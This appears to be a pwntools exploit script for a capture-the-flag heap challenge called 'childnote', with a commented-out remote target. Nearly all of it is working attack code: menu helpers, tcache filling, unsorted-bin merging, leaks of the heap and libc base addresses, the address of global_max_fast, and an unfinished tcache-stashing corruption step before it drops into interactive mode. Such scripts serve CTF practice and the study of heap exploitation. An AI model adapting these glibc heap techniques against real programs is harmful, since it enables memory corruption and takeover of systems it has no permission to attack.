from pwn import *

p = process('./childnote')
#p = remote('140.112.31.97', 30204)

def create(size, content):
    p.sendafter('>', '1')
    p.sendafter('size : ', str(size))
    p.sendafter('Content : ', content)

def show(index):
    p.sendafter('>', '2')
    p.sendafter('index : ', str(index))

def edit(index, content):
    p.sendafter('>', '3')
    p.sendafter('index : ', str(index))
    p.sendafter('Content : ', content)

def delete(index):
    p.sendafter('>', '4')
    p.sendafter('index : ', str(index))

# fill tcache
for i in range(9):
    create(0xc0, 'a'*0xc0)
for i in range(2, 9):
    delete(i)

# make unsorted bin merge
delete(0)
delete(1)

# information leak
show(2)
heap = u64(p.recvline().strip().ljust(8, b'\x00'))-0x10
success('heap base = 0x%x', heap)
show(0)
libc_base = u64(p.recvline().strip().ljust(8, b'\x00'))-0x1ebbe0
success('libc base = 0x%x', libc_base)
global_max_fast = libc_base+0x1eeb80
success('global_max_fast = 0x%x', global_max_fast)

# tcache stashing
create(0xd0, b'a')   # 9
for i in range(6):
    edit(9, b'a'*0xc0+p64(0xb1)+p64(0xa0))
    delete(1)
edit(9, b'a'*0xc0+p64(0xb1)+p64(0xa0))


p.interactive()